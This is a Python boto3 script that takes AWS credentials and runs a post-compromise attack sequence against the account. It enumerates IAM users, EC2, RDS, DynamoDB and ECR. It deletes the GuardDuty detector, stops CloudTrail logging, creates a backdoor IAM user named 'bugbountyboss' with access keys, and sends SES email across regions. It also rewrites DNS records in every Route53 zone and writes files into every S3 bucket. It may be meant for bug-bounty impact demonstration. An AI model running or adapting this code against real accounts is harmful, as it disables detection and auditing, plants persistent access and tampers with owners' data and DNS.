import boto3
import botocore

def perform_actions_with_creds(aws_access_key_id, aws_secret_access_key, region_name="us-east-1", do_evil=True):


    session_config = botocore.config.Config(
        user_agent="custom"
    )
    session = boto3.Session(
        aws_access_key_id=aws_access_key_id,
        aws_secret_access_key=aws_secret_access_key
    )
    iam = session.client('iam', region_name=region_name)
    guardduty = session.client('guardduty', region_name=region_name)
    ec2 = session.client('ec2', region_name=region_name)
    rds = session.client('rds', region_name=region_name)
    cloudtrail = session.client('cloudtrail', region_name=region_name)
    dynamodb = session.client('dynamodb', region_name=region_name)
    ecr = session.client('ecr', region_name=region_name)
    # ses = session.client('ses', region_name=region_name)
    acm = session.client('acm', region_name=region_name)
    s3 = session.client('s3', region_name=region_name, config=session_config)
    route53 = session.client('route53', region_name=region_name)

    # TODO Get info about current user

    # Enumerate all users
    try:
        users = iam.list_users()
        for user in users['Users']:
            print(user)
            # # Enumerate IAM permissions for a user via the SimulatePrincipalPolicy API
            # response = iam.simulate_principal_policy(
            #     PolicySourceArn='arn:aws:iam::123456789012:user/{}'.format(user['UserName']),
            #     ActionNames=['*']
            # )
            # print(response)
    except Exception as e:
        print("Could not list users with error", e)

    # Turn off GuardDuty
    try:
        detector = guardduty.list_detectors()
        guardduty.delete_detector(DetectorId=detector['DetectorIds'][0])
    except Exception as e:
        print("Could not list or delete guard duty detectors with error", e)
    try:
        # List SAML providers
        response = iam.list_saml_providers()

        # Print the list of SAML providers
        for provider in response['SAMLProviderList']:
            print(provider['Arn'])
    except Exception as e:
        print("Could not list SAML providers", e)
    # Turn off CloudTrail logging
    try:

        trails = cloudtrail.describe_trails()
        for trail in trails['trailList']:
            cloudtrail.stop_logging(Name=trail['Name'])
    except Exception as e:
        print("Could not describe trails or turn off cloudtrail with exception", e)

    # Enumerate EC2 instances
    try:
        instances = ec2.describe_instances()
        print(instances)
    except Exception as e:
        print("Could not enumerate ec2", e)

    # Enumerate RDS instances
    try:
        db_instances = rds.describe_db_instances()
        print(db_instances)
    except Exception as e:
        print("Could not enumerate rds", e)

    # Enumerate DynamoDB tables
    try:
        tables = dynamodb.list_tables()
        print(tables)
    except Exception as e:
        print("Could not enumerate dynamodb", e)
    #
    # Enumerate ECR repositories
    try:
        repositories = ecr.describe_repositories()
        print(repositories)
    except Exception as e:
        print("Could not enumerate ECR", e)

    # Creating a user
    try:
        response = iam.create_user(UserName='bugbountyboss')
        print("User created:", response)
        # Create an access key set for a user
        access_key = iam.create_access_key(UserName="bugbountyboss")
        print("Created access key for user", access_key)
        # create & attach admin policy?
    except Exception as e:
        print("Failed to create user:", e)
    # Checking permissions and attributes of the user
    try:
        user = iam.get_user(UserName='bugbountyboss')
        print("User details:", user)
    except Exception as e:
        print("Failed to get user details:", e)
    # Try to send an email using SES

    regions = [region_name]
    try:
        regions = [region['RegionName'] for region in ec2.describe_regions()['Regions']]
    except Exception as e:
        print("Could not get other possible regions.")

    for region in regions:
        try:
            # Create a new SES client for each region
            ses_client = session.client('ses', region_name=region)
            # Attempt to call a simple SES operation to check if it's available
            ses_client.get_send_quota()
            response = ses_client.list_identities(
                IdentityType='Domain'
            )
            print(f"For region {region}, domains are: {response['Identities']}")
            try:
                response = ses_client.send_email(
                    Source='sender@example.com',
                    Destination={
                        'ToAddresses': [
                            'receiver@example.com',
                        ],
                    },
                    Message={
                        'Subject': {
                            'Data': 'Test email',
                        },
                        'Body': {
                            'Text': {
                                'Data': 'Test email',
                            },
                        },
                    },
                )
                print("SES email sent:", response)
            except Exception as e:
                print("Failed to send SES email:", e)

        except Exception as e:
            print(f"SES not available in {region}: {str(e)}")

    # Try to issue a certificate using Certificate Manager
    try:
        response = acm.request_certificate(
            DomainName='example.com',
            ValidationMethod='DNS',
        )
        print("Certificate requested:", response)
    except Exception as e:
        print("Failed to request certificate:", e)

    # Try to modify a DNS record using Route53 for each hosted zone
    try:
        hosted_zones_response = route53.list_hosted_zones()
        for zone in hosted_zones_response['HostedZones']:
            try:
                response = route53.change_resource_record_sets(
                    HostedZoneId=zone['Id'],
                    ChangeBatch={
                        'Changes': [
                            {
                                'Action': 'UPSERT',
                                'ResourceRecordSet': {
                                    'Name': 'test.example.com',
                                    'Type': 'A',
                                    'TTL': 300,
                                    'ResourceRecords': [{'Value': '192.0.2.44'}],
                                },
                            },
                        ],
                    },
                )
                print("Route53 record modified:", response)
            except Exception as e:
                print("Failed to modify Route53 record:", e)
    except Exception as e:
        print("Fetching hosted zones failed with", e)

    # Try to modify an S3 object for each bucket
    try:
        buckets_response = s3.list_buckets()
        for bucket in buckets_response['Buckets']:
            try:
                # TODO Also try to get a few objects
                s3.put_object(Bucket=bucket['Name'], Key='test.txt', Body=open('test.txt', 'rb'))
                print("S3 object modified in bucket:", bucket['Name'])
                # TODO delete the object after

            except Exception as e:
                print("Failed to modify S3 object in bucket:", bucket['Name'], e)
    except Exception as e:
        print("S3 list buckets failed with", e)


if __name__ == "__main__":
    access_key = 'KEY'
    secret_key = 'SECRET'
    region_name="eu-north-1"
    perform_actions_with_creds(access_key, secret_key,region_name)
